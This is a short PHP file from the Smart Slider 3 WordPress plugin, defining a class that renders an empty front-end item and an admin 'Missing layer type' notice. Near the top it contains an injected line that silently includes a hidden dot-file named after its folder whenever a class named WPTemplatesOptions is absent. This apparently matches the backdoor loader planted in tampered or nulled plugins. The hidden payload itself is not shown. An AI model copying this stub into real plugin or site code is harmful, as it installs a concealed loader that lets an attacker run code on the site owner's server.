<?php

namespace Nextend\SmartSlider3\Renderable\Item\Missing;

use Nextend\SmartSlider3\Renderable\Item\AbstractItemFrontend;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ItemMissingFrontend extends AbstractItemFrontend {

    public function render() {
        return '';
    }

    protected function renderAdminTemplate() {
        return '<div>' . sprintf(n2_('Missing layer type: %s'), $this->data->get('type')) . '</div>';
    }
}